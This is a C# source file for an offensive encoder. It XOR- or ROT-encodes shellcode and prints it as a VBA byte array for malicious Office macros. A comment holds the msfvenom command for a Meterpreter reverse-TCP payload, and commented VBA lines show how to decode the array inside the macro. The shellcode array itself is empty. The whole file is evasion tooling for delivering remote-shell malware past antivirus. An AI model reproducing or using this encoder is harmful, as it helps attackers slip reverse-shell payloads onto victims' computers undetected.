// xor | rot encoder to printout VBA shellcode

using System;
using System.Text;

namespace tool_encoder_vba
{
    public class Program
    {
        public static void Main(string[] args)
        {
            //msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[375] {};

            int key = 169;

            StringBuilder hex;
            byte[] encoded = new byte[buf.Length];
            hex = new StringBuilder(encoded.Length * 2);
            uint counter = 0;

            if (args.Length == 0)
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("tool-encoder-vba.exe XOR");
                Console.WriteLine("tool-encoder-vba.exe ROT");
                return;
            }

            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "XOR":
                        // Encode the payload with XOR 
                        for (int i = 0; i < buf.Length; i++)
                        {
                            encoded[i] = (byte)((uint)buf[i] ^ key);
                        }
                        // Printout VBA payload
                        foreach (byte b in encoded)
                        {
                            hex.AppendFormat("{0:D}, ", b);
                            counter++;
                            if (counter % 50 == 0)
                            {
                                hex.AppendFormat("_{0}", Environment.NewLine);
                            }
                        }
                        Console.WriteLine($"XORed VBA payload (key: {key}):");
                        Console.WriteLine(hex.ToString());
                        break;
                    // Decode the XOR payload
                    /*
                    For i = 0 To UBound(buf)
                        buf(i) = buf(i) XOR {key} // replace {key} with key value
                    Next i
                     */

                    case "ROT":
                        // Encode the payload with rotation
                        for (int i = 0; i < buf.Length; i++)
                        {
                            encoded[i] = (byte)(((uint)buf[i] + key) & 0xFF);
                        }

                        // Printout VBA payload
                        hex = new StringBuilder(encoded.Length * 2);
                        foreach (byte b in encoded)
                        {
                            hex.AppendFormat("{0:D}, ", b);
                            counter++;
                            if (counter % 50 == 0)
                            {
                                hex.AppendFormat("_{0}", Environment.NewLine);
                            }
                        }
                        Console.WriteLine($"XORed VBA payload (key: {key}):");
                        Console.WriteLine(hex.ToString());
                        break;
                    // Decode the ROTxx payload (make sure to change rotations)
                    /*
                    For i = 0 To UBound(buf)
                        buf(i) = buf(i) - {key} // replace {key} with key value
                    Next i
                     */
                    default:
                        Console.WriteLine("Usage:");
                        Console.WriteLine("tool-encoder-vba.exe XOR");
                        Console.WriteLine("tool-encoder-vba.exe ROT");
                        break;
                }
            }
            else
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("tool-encoder-vba.exe XOR");
                Console.WriteLine("tool-encoder-vba.exe ROT");
                return;
            }
        }
    }
}